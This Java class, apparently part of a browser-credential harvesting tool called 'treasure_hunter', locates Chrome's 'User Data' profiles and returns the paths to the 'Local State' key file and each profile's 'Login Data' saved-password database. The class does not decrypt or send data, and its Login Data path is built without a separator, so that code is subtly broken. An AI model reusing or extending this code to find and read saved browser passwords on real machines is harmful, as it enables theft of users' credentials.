package com.treasure_hunter_java.browsers;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

/**
 * Класс Chrome расширяет абстрактный класс Browser и представляет функциональность браузера Chrome.
 */
public class Chrome extends Browser {

    // Путь к директории браузера Chrome
    Path dirName = Path.of("C:/Users/Mikle/AppData/Local/Google/Chrome/User Data/");

    // Путь к файлу Local State
    Path localStatePath = Path.of("C:/Users/Mikle/AppData/Local/Google/Chrome/User Data/Local State");

    // Список профилей браузера Chrome
    List<Path> profiles = new ArrayList<>();

    /**
     * Собирает профили браузера Chrome.
     * Вызывает метод collectProfiles() родительского класса Browser,
     * чтобы собрать профили на основе указанной директории.
     */
    public void collectProfiles() {
        super.collectProfiles(dirName);
        profiles = super.getProfiles();
    }

    /**
     * Возвращает список профилей браузера Chrome.
     *
     * @return Список профилей браузера Chrome
     */
    @Override
    public List<Path> getProfiles() {
        return profiles;
    }

    /**
     * Возвращает путь к файлу Local State браузера Chrome.
     *
     * @return Путь к файлу Local State
     */
    public Path getLocalState() {
        return localStatePath;
    }

    /**
     * Возвращает путь к файлу данных входа в систему для указанного профиля.
     *
     * @param path Путь к директории профиля
     * @return Путь к файлу данных входа в систему
     */
    public Path getLoginData(Path path) {
        return Path.of(path + "Login Data");
    }

}
